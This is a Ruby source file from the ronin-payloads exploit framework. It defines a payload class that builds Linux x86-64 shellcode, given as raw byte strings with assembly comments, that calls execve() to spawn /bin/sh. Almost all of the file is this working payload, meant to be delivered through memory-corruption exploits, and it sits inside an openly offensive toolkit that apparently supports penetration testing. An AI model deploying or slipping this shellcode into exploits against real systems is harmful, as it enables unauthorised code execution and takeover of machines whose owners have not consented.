# encoding: ASCII-8BIT
# frozen_string_literal: true
#
# ronin-payloads - A Ruby micro-framework for writing and running exploit
# payloads.
#
# Copyright (c) 2007-2026 Hal Brodigan (postmodern.mod3 at gmail.com)
#
# ronin-payloads is free software: you can redistribute it and/or modify
# it under the terms of the GNU Lesser General Public License as published
# by the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# ronin-payloads is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU Lesser General Public License for more details.
#
# You should have received a copy of the GNU Lesser General Public License
# along with ronin-payloads.  If not, see <https://www.gnu.org/licenses/>.
#

require 'ronin/payloads/shellcode/exec_shell_payload'

module Ronin
  module Payloads
    module Shellcode
      module Linux
        module X86_64
          #
          # Linux x86-64 shellcode that calls `execve()` with `/bin/sh`.
          #
          class ExecShell < ExecShellPayload

            register 'shellcode/linux/x86_64/exec_shell'

            arch :x86_64
            os :linux

            author "zbt"

            summary 'Linux x86-64 execve() shellcode'
            description <<~DESC
              Linux x86-64 shellcode that calls execve() with "/bin/sh".
            DESC

            references [
              "https://shell-storm.org/shellcode/files/shellcode-603.html"
            ]

            #
            # Builds the shellcode.
            #
            def build
              @payload = "\x48\x31\xd2" +     # xor    %rdx, %rdx
                         "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68" + # mov	$0x68732f6e69622f2f, %rbx
                         "\x48\xc1\xeb\x08" + # shr    $0x8, %rbx
                         "\x53" +             # push   %rbx
                         "\x48\x89\xe7" +     # mov    %rsp, %rdi
                         "\x50" +             # push   %rax
                         "\x57" +             # push   %rdi
                         "\x48\x89\xe6" +     # mov    %rsp, %rsi
                         "\xb0\x3b" +         # mov    $0x3b, %al
                         "\x0f\x05"           # syscall
            end

          end
        end
      end
    end
  end
end
